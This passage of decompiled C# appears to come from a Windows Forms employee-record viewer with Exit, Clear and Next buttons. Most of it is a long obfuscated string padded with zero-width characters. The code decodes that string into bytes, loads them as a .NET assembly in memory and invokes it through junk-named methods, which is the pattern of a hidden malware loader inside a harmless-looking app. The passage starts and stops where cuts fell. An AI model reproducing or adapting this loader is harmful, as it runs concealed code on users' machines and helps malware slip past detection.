0099\u0084\u200cd\u0099\u0097§v\u0099\u0097¦q\u200cL\u0083nK\u200cthb§\u0094hb¥wab\u008e\u0081xd\u0090INI\u0084\u0081mG\u0084\u0081k\u200c~hTm\u0090¢w³q\u0097aj\u0084\u0081xb\u0094\u0081x\u009f\u0091\u00afd\u0099\u0097¦K\u0099\u0097¦G\u200c\u0084I~G\u0081Gg{wG\u009fm\u200chT\u00af\u0081G\u009f¬\u0084\u0081gH\u0083\u0080°¥\u0093j\u009d\u200c}\u00a0~\u0099\u0084\u200caj\u0084\u0081xw\u008e\u0081\u0099\u009f\u0090\u200ca¢\u0084\u0081x\u0096wITH\u0090¢w\u200cwIT¬\u0083IgG\u200cbe\u0099q\u200c\u200c\u0099k{e\u200cwITª\u0091h\u009f©\u0083\u0081x¥\u0090INz\u0084\u0080°\u0099\u0094hgG\u008e\u0080T¬\u0091GgG\u0093jm¥\u0083¢~G\u0084waz\u0093\u0080NG\u008e\u0080H\u009fwITª\u0091hgG\u008e\u0080m¥\u0090h\u009fG\u0094}gG\u0093jm¥\u0083¢~G\u0084waa\u0091Ks\u009f\u0090\u0080m©\u0094~x¥\u0093h°\u009fw\u0081xG\u0091\u00a0\u009f\u009a\u0093\u0081x\u009f\u200ceg³\u0091I~ª\u0083\u00a0°Nxh~³\u0083Km¥\u0091jx¥\u0090INa\u0093jx²\u008e\u0080mH\u0093h}\u200cw\u0081s³\u0084\u0080H\u009a\u0090j\u009fd\u0090IN\u00a0\u008e\u0080\u0093H\u0091\u00a0gG\u008e\u0080T¬w\u0081xG\u0091\u00a0\u009f\u009a\u0093\u0081x\u009f\u200ceg³\u0091I~ª\u0083\u00a0°NwITª\u0091hg¬\u0094}gG\u0093jm¥\u0083¢~G\u0084waa\u0091Ks\u009f\u0090\u0080m©\u0094~a²\u0090IxH\u0083Kxa\u0093jx²\u008e\u0080mH\u0093h}\u200cw\u0081s³\u0084\u0080H\u009a\u0090j\u009fd\u0090KaN\u0091\u00a0\u009f¢\u008ejxa\u0093jx²\u008e\u0080mH\u0093h}\u200cw\u0081s³\u0084\u0080H\u009a\u0090j\u009f}\u0091\u00a0g\u009d\u0084\u0080H\u0099\u0091\u00a0ªa\u0093jx²\u008e\u0080mH\u0093h}\u200cwITª~\u00a0\u009f³\u008e\u0080m©\u0084}gG\u0093jm¥\u0083¢~G\u0084waj\u0093\u0080\u009f\u009dw\u0081xG\u0091\u00a0\u009f\u009a\u0093\u0081x\u009f\u200ceg³\u0091I~ª\u0083\u00a0°Nx\u00a0\u009f©\u0084~\u0084\u009f\u0091¢s¥\u0090INa\u0093jx²\u008e\u0080mH\u0093h}\u200c}K~\u00af\u0091jm\u009f\u0091Ksm\u0090hx\u0099\u0091IHa\u0093jx²\u008e\u0080mH\u0093h}\u200cb£\u200c\u0094\u009a°¦³\u0090e\u0094³©vL¬ke°¦\u0094\u200c\u200ckªK¥\u0091~\u0099\u009dGLk\u009dk©dT\u0096\u0096°j~b\u009c£j\u200c\u200ckae\u0097Gxewq\u200c\u200c\u200ceda\u0099eq\u200c\u00af\u0083\u0093\u200c°£jgak\u0084e\u0097Gkja\u00af\u0091b\u200c\u0097kb\u200c\u0097kb\u200c\u0097\u0093\u200c\u00af\u0097kjwqkb\u200c}\u0097\u200cwe\u0093awk\u0093awwn\u200cxk\u0084a²\u200cb\u200cxk\u0084ez\u009ddk\u200c\u200caa\u0097\u200cajw}\u0093axejda\u00afkjw}kb\u200ckbj\u200c\u0097kjwq\u0093\u200c\u00af}n\u200c\u0097Lzqwqn\u200cwLme\u200ceb\u200cx\u200c\u0093j\u0097\u200ck\u200c\u00af£aaw\u0091\u200c\u200c\u0099Ggjw}tgw\u0091te\u009c}kb\u200c\u0097ke{\u009db\u200c\u0097kzdw\u0097kjwq\u0093\u200c\u00afwn\u200cxmaa\u200c£ae\u009d}eb\u0097ezvw\u0083n\u200c\u0099kTe\u009d\u009dh\u200c\u200cez{xgxa\u009a\u200cae\u0097Gz{w\u0083\u200c\u200cxGge\u009d}ma\u00af}\u0091e\u009dekbaGda\u200c£bd\u0097Lhk\u200ckad\u0099m\u0084ab\u200caj\u200cLh\u200c\u200ckzxwLte\u00af\u0091pe\u009de\u0091e\u0097Gzdxm\u0093ja\u00afkbaGdjwqeb\u0097ktj\u200c\u009d\u200caa\u00af\u0091d\u0099g¥jx\u00afe\u200c\u200ceab\u200c\u0083\u200c\u200c\u00afetd\u0097Lda\u0099e}b\u00af\u0091jb\u200c\u0097kb\u200c\u0097\u0093\u200c°Gd\u200c\u0099L\u200c\u200c²\u200c\u200cb\u200c\u0097w\u200cwqkj\u0097\u200cd\u200c\u00af©jb\u200c\u0097kb\u200c\u0097kjwqkb\u200c\u0083\u200c\u200c\u00afekb\u200cqda\u0099ks\u200c\u00af\u0083xka£jew\u0097kja}z\u0094wete¢Gdb\u200c\u0097kba\u00af\u0091b\u200c\u0097kjwq\u0093\u200c\u00afk\u0093\u200c\u00afk\u0093d\u0097\u0083\u0097\u200cxn\u200c\u0099wqdk\u200c\u200ctb\u200c\u200ced\u0099msb\u200c}kb\u0097\u0091jb\u200c\u0097kb\u200c\u0097kjwqke\u200cedbaL\u200cb\u200c\u0097ta\u00af\u0097ke{\u009dxtw\u0097kbaGdjwqk\u200c\u200cwxtw\u0097kb\u200c\u0097n\u200c\u200c\u0083xtw\u0097kb\u200c\u0097h\u200c\u00af©ja\u00af\u0097gb\u200c\u0097kjwq\u0093\u200c\u00afq\u0097\u200c\u200c}k\u200c\u200cqgeaeN\u200c\u00afqqa\u00af\u0097kb\u200c\u0097kjwq\u0093\u200c\u00af\u0097k\u200c\u0099Laa\u009a\u200cb\u200cw\u0097zzw©w\u200c\u0097}aj\u0097\u200ckj\u0097ekb\u200c\u0097jaw\u0097\u0091b\u200c\u0097\u0093\u200c\u00afw\u200c\u200cam\u0084a\u0097\u200cbe\u009f\u009ddb\u200cGja\u00af\u0097z\u0097k\u009dkb\u200c\u0097\u0093\u200c°Gda\u0097\u200cae\u009f\u009d\u0093aw\u0097\u200c\u200c°m\u0084jw}d\u200c\u00af\u009djax\u00afkbaGdjwqqa\u00af\u0097kb\u200c\u0097kb\u200c\u0097\u0093\u200c°Gda\u0097\u200cbbaGgb\u200c\u0097\u200ca\u200c\u0097\u0093aw\u0097h\u200c\u00af£ja\u00af\u0097\u0091b\u200c\u0097kbaGdaz\u200cajw}tb°\u200cbaaGgj\u0097e\u0094\u200c\u200cqhb\u0097\u0091hba\u00afkbaGdjwqe\u200c\u200c\u200czqw\u0083\u200c\u200c\u0099k°\u200c\u00af\u0097na\u00af\u0091k\u200c\u0097\u0097kb\u200c\u0097\u0093\u200c\u00af\u0091\u200c\u200c\u0097kxtxeNbw\u200ce\u200c\u0099eNe{\u009dha\u0097Lw\u200c\u0097\u0083\u0091j\u0097e\u0094\u200cag¥jx\u00afk\u200c\u00af\u0091\u0097\u200c\u00af\u0097\u0093aw\u0097kda\u200caa\u0097\u0097\u0094\u200caGgb\u200c\u0097ka\u0097\u0083\u0097\u200c\u0099eNb\u200c\u0097pe\u200cege{\u009d\u0094\u200c\u200c\u0097k\u200c\u00af\u0097ke\u200cedbaL\u200ca\u0097\u0083qa\u00af\u0097kj\u200c\u0097kb\u200c\u0097\u0093\u200c°Gdaw\u200cbd\u0097Ltb\u0099\u200cba\u200cL\u0094\u200cxL\u200c\u200c\u00afqek\u200ceab\u200c\u0097a\u200c\u200c\u0097\u200c\u200c\u200c\u200c\u200c\u200caLa\u200c\u200ce\u200c~\u200ck\u0080~Km\u0099\u0091eN\u00ad\u0090\u009d~L\u0083I~\u00af\u0093h\u009f\u00ad\u0090\u009fx£\u0091\u00a0TK\u0091\u00afeek\u200cead\u0099La\u200ca\u009fb\u0093\u0080N¥\u0084¢}\u0097x¢m\u0099\u0090\u0080~K\u0090Km§kbG\u0097~}\u009d\u0097{h\u009f\u009a\u200c\u200c\u200c\u0097\u200cw\u200c\u0090wK~³\u0093hTªkemH\u0090\u00a0\u009f\u00a0\u0093z\u200c¬{\u009d~}khs\u00ad\u0090¢x²\u0090I°³\u200c\u200c\u200cg\u200cw\u200c\u200c\u200c\u200c\u200c\u0083\u200cw\u200c{w¢~¬\u008e\u0080\u0084Hkgx\u009f\u0083I\u0099¬\u0090I°\u00ad\u0084I\u009f\u009f\u0091\u00af\u200c\u200cd\u0097e\u200cb}mH\u0090\u00a0\u009f\u00a0\u0093za~zw\u200c\u200cg\u00afe\u200ce\u009ds\u00ad\u0091j\u009f²\u008e\u0080\u0093£\u0093bdb¦z\u200c\u0097q\u009c\u200c°s\u0097\u200c\u200cab\u200ca\u200cwk¥\u200cw\u200c\u009dt\u0080\u0084\u009atdk\u00afs\u00a0}ªsd\u200c\u00af\u0084\u009aGGq³\u0083\u00afp{\u009dHs³\u009dªqd\u009dIq{g\u0099sIm\u00a0\u0083{\u0083H\u200c\u200c\u200cq\u200cw\u200cjqzL³p\u009c\u200c¬q\u200c\u200c\u200ca\u200ce\u200c\u200c\u200cd\u009d~\u00af\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cd?~\u00af\u200c\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cRg\u0091\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u0096wIT²xh°©{\u0080g¥\u0090\u0097aª\u0091Is\u00ad\u0091\u00a0~\u009fp\u00a0x©\u0090\u200c\u200c\u200c\u200c\u200c\u200c\u200cE²}\u200cke\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200ca\u200c\u200c\u200c\u200c\u200c\u0083\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200c\u200ce\u200c\u200c\u200c\u200c\u00af\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200ca\u200c\u200c\u200c\u200c\u200c\u200cak\u200c\u200c\u200c\u200c\u0080h\u200c\u200c\u200cmwd\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cmwds\u200c\u200c\u200c\u200cg\u0083\u200c}\u00afa\u0096\u200cg\u0083\u200cxwaz\u200cgq\u200czwav\u200ceL\u200c\u0081\u00afam\u200ceL\u200cx\u0097av\u200c\u200c\u200c\u200c\u200c\u200cbTatE?\u200c\u200c\u200ca\u200c\u200cq\u200c\u200cw\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u00af\u200ca\u200c\u200c\u200c\u200c\u200c\u200c\u200cE\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cw\u200c\u200c\u200c\u200cb\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cx\u200c\u200c\u200c\u200c\u200ce\u200c~\u0097a\u0099\u200cjk\u200cx\u0097a¥\u200ch\u00af\u200c\u0084wam\u200chL\u200c\u0084\u0097a\u00ad\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u009d\u200c\u200cw\u200c\u200c\u200ca}\u200cjk\u200c\u0083wa¬\u200cjq\u200c\u0090\u200ca\u0099\u200cjw\u200c\u008ewa\u00ad\u200chL\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c©\u200c{G\u200c\u0097\u200c\u200c\u200cwa{\u200cjw\u200c\u0091\u0097a¥\u200chL\u200c\u0084\u00afah\u200ch\u009d\u200c\u0090\u200ca\u009f\u200ce\u009d\u200c\u0090\u0097a\u00a0\u200chR\u200c\u200c\u200cdw\u200c\u0097\u200c\u200c\u200cw\u200c\u00af\u200cd\u200c\u200cq\u200c\u200c\u00af\u200cd\u200c\u200cs\u200ca\u009a\u200cd\u200c\u200c\u200c\u200caw\u200ca\u00af\u200c\u200cwad\u200chR\u200c\u0090waª\u200ch}\u200c\u0090\u0097aG\u200cjq\u200c\u200c\u200cad\u200cj}\u200c\u0091\u00afaG\u200chR\u200c\u0090w\u200c\u0097\u200cek\u200c\u0093wa¬\u200ch\u009d\u200c\u0084\u0097aH\u200cb\u200c\u200cp\u0097at\u200ce}\u200c~\u200c\u200c\u0097\u200chq\u200c\u0090\u00afa¬\u200cjw\u200c\u0091\u0097a\u00ad\u200ch\u00af\u200c\u0091\u00af\u200c\u200c\u200ce\u0097\u200cg\u200c\u200ca\u200ceq\u200c\u0090\u00afaª\u200cj\u200c\u200c\u0083wa¬\u200cj\u009d\u200c{\u0097a\u0099\u200chG\u200c\u0084w\u200c\u200c\u200c\u200c\u200c\u200cw\u0097aH\u200chL\u200c\u008ewa\u00a0\u200cj}\u200ck\u200ca}\u200ch}\u200c\u0083\u00afa£\u200chL\u200c\u0090\u00afa©\u200chR\u200c\u0084\u00afa¥\u200ch}\u200c\u0091\u00af\u200c\u200c\u200cg\u00af\u200ch\u0097\u200ca\u200ce\u0083\u200c\u008ewa©\u200ch}\u200cx\u200ca\u009f\u200cjq\u200c\u0083\u00afa²\u200ch\u009d\u200c\u0091\u200caG\u200ch\u009d\u200c\u0090\u00afa¬\u200c\u200c\u200c\u200c\u200c\u200cab\u200cj}\u200c\u0090\u0097a¥\u200ch\u0083\u200c\u0093w\u200c\u0097\u200ce\u0083\u200c\u0091\u0097a\u0099\u200chG\u200c\u0084waK\u200chR\u200c\u0091\u0097a§\u200cb\u200c\u200cpw\u200c\u0097\u200cg}\u200czw\u200c\u0097\u200ce\u00af\u200c\u008ewa\u009a\u200c\u200c\u200c\u200cq\u200c\u200ck\u200c\u200ce\u200cx\u0097a¥\u200ch\u00af\u200c\u0084wa\u0080\u200ch}\u200c\u0091\u0097a³\u200ch\u009d\u200c\u0090\u00afa¬\u200c\u200c\u200c\u200c\u200c\u200c\u200c°\u200cbL\u200cq\u00af\u200c¬\u200cd\u200c\u200cp\u0097\u200c\u00af\u200c\u200c\u200c\u200cv\u200c\u200ct\u200c\u200ce\u200czwa¬\u200cjw\u200c\u0084wa²\u200chL\u200c\u0083wa©\u200ceL\u200c\u0083waª\u200ch}\u200c\u200c\u200cab\u200cj}\u200c\u0090\u0097a¥\u200ch\u0083\u200c\u0093w\u200c¬\u200cg}\u200czw\u200c¬\u200chw\u200c\u0090\u200ca©\u200c\u200c\u200c\u200cz\u200c\u200cz\u200c\u200ce\u200c{\u200ca\u009f\u200ch\u0091\u200c\u0083wa©\u200ceq\u200c\u0090\u00afa\u00af\u200cj\u009d\u200c\u0091\u0097a¥\u200ch\u0091\u200c\u008e\u200caG\u200c\u200c\u200c\u200cw\u00afa\u00ad\u200cj\u200c\u200c\u0094wa²\u200ch\u009d\u200c\u0084\u00afa£\u200cjw\u200ck\u200cb¥\u200cb\u200c\u200ck\u200c\u200c²\u200cd\u200c\u200cqw\u200cI\u200c\u200c\u200c\u200cn\u0097\u200ca\u200c\u200ce\u200c{\u200ca\u009f\u200ch\u0091\u200c\u0083wa©\u200cgw\u200c\u0091\u0097a\u0099\u200chw\u200c\u0084waª\u200che\u200c\u0091\u0097a§\u200cjq\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200cae\u200c\u200cL\u200c\u200cwav\u200cjk\u200c\u008ewa¢\u200ch\u009d\u200c\u0090\u0097a\u0099\u200ch\u00af\u200cx\u0097a¥\u200ch\u00af\u200c\u0084wa¬\u200che\u200c\u0090wa\u009f\u200c\u200c\u200c\u200cw\u0097aH\u200chL\u200c\u008ewa\u00a0\u200cj}\u200cp\u0097a~\u200ce\u009d\u200cp\u0097a\u009d\u200ch\u00af\u200c\u0090\u200c\u200c\u200c\u200cdw\u200cb\u0097\u200ca\u200cg\u200c\u200c\u0091\u0097a\u00ad\u200chw\u200c\u0093wa\u009c\u200cjw\u200c{\u0097a\u0099\u200chG\u200c\u0084w\u200c\u200c\u200c\u200c\u200c\u200cw\u0097aH\u200chL\u200c\u008ewa\u00a0\u200cj}\u200ck\u200ca~\u200ce\u009d\u200c\u200c\u200c\u200cG\u200c\u200c\u0097\u200c\u200cwaw\u200cjk\u200c\u0090\u00afa\u009d\u200cj}\u200c\u0083\u00afaG\u200cg\u0083\u200c\u0084wa²\u200cjq\u200c\u008ewa\u00ad\u200chL\u200c\u200c\u200c\u200c°\u200cbL\u200cq\u00af\u200c¬\u200cd\u200c\u200cp\u0097\u200c\u00af\u200c\u200c\u200c\u200ct\u200c\u200ck\u200c\u200ce\u200cwwa³\u200cjq\u200c\u0084waª\u200chk\u200c\u0090\u200caN\u200cb\u200c\u200c~\u0097a\u009f\u200cjk\u200c\u0091\u00afa¥\u200chR\u200c\u0090\u0097\u200c\u200c\u200cde\u200cp\u0097\u200c³\u200cbL\u200cq\u200c\u200c¬\u200cd\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200caw\u200c\u200c\u200cq\u200c\u200c\u200c\u200ced\u0097\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c\u200c";
		string string_2 = OIQAKDS(MainForm.smethod_72(string_, "\u200c", "_"));
		byte[] rAW = MainForm.smethod_74(MainForm.smethod_73(string_2), 0, MainForm.smethod_65(string_2));
		Assembly t = OIQDKLSDJX(rAW, AccountDomainSid: true);
		string string_3 = "b";
		if (MainForm.smethod_75(string_3, "", bool_0: false) != 0)
		{
			jjjjjjjjj(t);
		}
		return s;
	}

	public static object jjjjjjjjj(object t)
	{
		UY((Assembly)t);
		object result = default(object);
		return result;
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		try
		{
			MainForm.smethod_82(inputFile);
			MainForm.smethod_83((Form)(object)this);
		}
		catch (Exception exception_)
		{
			MainForm.smethod_84(exception_);
			MainForm.smethod_83((Form)(object)this);
			MainForm.smethod_85();
		}
	}

	private void btnClear_Click(object sender, EventArgs e)
	{
		MainForm.smethod_25(lblFirstName, string.Empty);
		MainForm.smethod_25(lblMiddleName, string.Empty);
		MainForm.smethod_25(lblLastName, string.Empty);
		MainForm.smethod_25(lblEmployeeNum, string.Empty);
		MainForm.smethod_25(lblDept, string.Empty);
		MainForm.smethod_25(lblTelephone, string.Empty);
		MainForm.smethod_25(lblExtension, string.Empty);
		MainForm.smethod_25(lblEmail, string.Empty);
		MainForm.smethod_86((Control)(object)lblFirstName);
	}

	private void btnNext_Click(object sender, EventArgs e)
	{
		//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (MainForm.smethod_87(inputFile) != -1)
			{
				MainForm.smethod_25(lblFirstName, MainForm.smethod_88(inputFile));
				MainForm.smethod_25(lblMiddleName, MainForm.smethod_88(inputFile));
